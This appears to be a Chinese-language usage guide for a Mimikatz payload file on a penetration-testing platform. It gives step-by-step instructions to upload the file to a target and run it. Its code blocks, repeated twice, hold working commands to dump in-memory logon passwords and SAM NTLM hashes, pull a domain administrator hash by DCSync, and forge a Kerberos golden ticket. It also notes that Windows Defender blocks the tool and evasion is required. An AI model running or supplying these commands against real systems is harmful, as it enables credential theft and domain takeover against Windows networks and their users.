## 📦 载荷使用说明：mimikatz_commands.txt

该载荷文件主要配合 **Mimikatz** 算子（攻击技法）使用。以下是详细的操作步骤和参数说明。

### 📝 操作步骤

1. **准备阶段**：将本载荷文件通过系统的文件管理功能或光盘摆渡方式上传至目标虚拟机或宿主机指定目录。
2. **执行阶段**：在目标环境中调用 `Mimikatz` 算子，并指定本载荷文件作为配置或脚本输入。
3. **结果验证**：观察执行日志，确认算子执行成功，并根据返回结果进行下一步渗透测试策略的制定。

### ⚙️ 参数说明

以下是本载荷涉及的核心参数及其含义（请根据实际隔离网络环境进行修改）：

**配置示例 1**：
```bash
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# 提取 NTLM Hash
mimikatz # lsadump::sam

# DCSync 拉取域管 Hash
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
```

**配置示例 2**：
```bash
mimikatz # kerberos::golden /user:Administrator \\
  /domain:corp.local /sid:S-1-5-21-xxx \\
  /krbtgt:HASH /ptt
```

### 📖 原始工具说明

以下是系统内置的原始工具说明，供参考：

## Mimikatz 内存凭据提取

### 提取内存凭据
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# 提取 NTLM Hash
mimikatz # lsadump::sam

# DCSync 拉取域管 Hash
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
```

### 黄金票据
```
mimikatz # kerberos::golden /user:Administrator \\
  /domain:corp.local /sid:S-1-5-21-xxx \\
  /krbtgt:HASH /ptt
```

- ⚠ 需要 SYSTEM 或 SeDebugPrivilege
- Windows Defender 会拦截，需免杀